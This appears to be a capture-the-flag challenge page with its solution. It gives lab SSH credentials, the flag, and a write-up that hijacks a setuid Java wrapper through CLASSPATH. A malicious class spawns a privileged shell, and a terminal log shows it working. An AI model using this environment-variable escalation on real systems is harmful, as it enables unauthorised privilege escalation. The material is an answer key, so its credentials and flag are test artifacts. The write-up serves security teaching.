# demo
## Description 

`ssh student@3.27.46.246`

Password: `Ayw8U1bm2D857UASzd`

Note: ssh will connect to a newly-created ephemeral docker container each time you connect - files will not persist.

Docker escape is not part of the challenge and is not known to be possible, but it would be a valid solution. Please avoid interfering with the containers of other participants if you manage to do so.

---

**Category:** 
pwn

**Difficulty:**
hard

**Author:** 
Jamie

**Flag:**

`AHOY{i_rep0rted_th15_bu9_f1ve_yarr5_ag0}`

## Exploit
You want to read `/demo_files/FlagCheck.class`, but you don't have permission, you can only run it via the setuid `demo` executable. The binary fails to strip (most) environment variables. As such, you can take over execution as the `demo` user. For exmample:

1. Make an alternative FlagChecker.java, e.g. the following, and `javac` it

```
import java.lang.ProcessBuilder;
import java.lang.ProcessBuilder.Redirect;
import java.lang.Process;
import java.lang.Exception;

class FlagCheck {
	public static void main(String[] argv) {
		    ProcessBuilder pb = new ProcessBuilder("sh", "-p");
		    pb.inheritIO();
		    try {
		    Process p = pb.start();
		    p.waitFor();
		    } catch (Exception e) {e.printStackTrace();}
	}
}
```

2. Run demo as `CLASSPATH="/path/to/folder/with/malicious/FlagChecker/dot/class" ./demo yarr101 flag`
3. Get a shell
4. Exfiltrate the original class file for decompilation, or simply use `strings` (provided on the server):

```
student@gretarr-pt ~ % CLASSPATH=/home/student /demo yarr101 flag
$ whoami
demo
$ strings FlagCheck.class | grep AHOY
(AHOY{i_rep0rted_th15_bu9_f1ve_yarr5_ag0}
$   
```

Other techniques are likely possible. For example, `JVM_JAVA_OPTIONS` can be used to provide additional args to the JVM - the `-cp` arg can be used to control the classpath as above, and I imagine there are more exotic solutions invovling e.g. attaching a debugger to the JVM using this variable. `_JAVA_OPTIONS` and `JAVA_TOOL_OPTIONS` *do not work* for some reason, and I have no idea why - seemingly the JVM disregards these if euid != ruid.

